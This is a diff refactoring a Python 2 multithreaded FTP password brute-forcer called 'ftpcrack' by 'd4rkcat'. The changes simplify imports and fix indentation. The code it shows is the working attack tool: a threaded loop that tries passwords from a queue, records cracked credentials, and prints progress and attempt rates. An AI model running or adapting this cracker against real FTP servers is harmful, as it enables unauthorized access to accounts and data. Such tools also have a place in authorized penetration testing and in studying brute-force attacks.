@@ -1,11 +1,14 @@
 #!/usr/bin/python
 
-import argparse, sys, os, signal, Queue, threading, time, random
+import argparse, signal, Queue, time
+from threading import Thread, Lock
+from sys import argv, stdout
+from os import getpid, kill
 from ftplib import FTP, error_perm
 
-class myThread (threading.Thread):
+class myThread (Thread):
     def __init__(self, threadID, name, q):
-        threading.Thread.__init__(self)
+        Thread.__init__(self)
         self.threadID = threadID
         self.name = name
         self.q = q
@@ -29,8 +32,8 @@ class Timer():
 
 class Printer():
     def __init__(self,data):
-        sys.stdout.write("\r\x1b[K"+data.__str__())
-        sys.stdout.flush()
+        stdout.write("\r\x1b[K"+data.__str__())
+        stdout.flush()
 
 def ftpcrack(threadName, q):
 	while not exitFlag:
@@ -47,16 +50,16 @@ def ftpcrack(threadName, q):
 					cracked.append(creds)
 					mdone = "1"
 				except error_perm:
-						if len(password) < 20:
-							add = 20 - int(len(password))
-							password = str(password) + " " * add
-						
-						progdone = len(passwords) - workQueue.qsize()
-						percent = round(float(100.00) / len(passwords) * progdone,2)
-						token = time.time() - startcnt
-						eta = round(token / progdone * len(passwords) - token,2)
-						Printer(" [>] " + str(percent) + "% Now trying: " + str(progdone) + "/" + str(len(passwords)) + " at " + str(round(progdone / token,2)) + " tries per second    User: " + user + " Password: " + password + "  -  Unsuccessful Login  ETA: "  + str(time.strftime('%H:%M:%S', time.gmtime(eta))))
-						mdone = "1"
+					if len(password) < 20:
+						add = 20 - int(len(password))
+						password = str(password) + " " * add
+					
+					progdone = len(passwords) - workQueue.qsize()
+					percent = round(float(100.00) / len(passwords) * progdone,2)
+					token = time.time() - startcnt
+					eta = round(token / progdone * len(passwords) - token,2)
+					Printer(" [>] " + str(percent) + "% Now trying: " + str(progdone) + "/" + str(len(passwords)) + " at " + str(round(progdone / token,2)) + " tries per second    User: " + user + " Password: " + password + "  -  Unsuccessful Login  ETA: "  + str(time.strftime('%H:%M:%S', time.gmtime(eta))))
+					mdone = "1"
 				else:
 					pass
 		else:
@@ -64,7 +67,7 @@ def ftpcrack(threadName, q):
 			
 def killpid(signum = 0, frame = 0):
 	print "\r\x1b[K"
-	os.kill(os.getpid(), 9)
+	kill(getpid(), 9)
 
 parser = argparse.ArgumentParser(prog='ftpcrack', usage='ftpcrack [options]')
 parser.add_argument('-t', "--threads", type=int, help='number of threads (default: 100)')
@@ -83,12 +86,12 @@ print '''
 				       By d4rkcat
 '''
 
-if len(sys.argv) == 1:
+if len(argv) == 1:
 	parser.print_help()
 	exit()
 
 signal.signal(signal.SIGINT, killpid)
-queueLock = threading.Lock()
+queueLock = Lock()
 cracked = []
 threads = []
 creds = ""
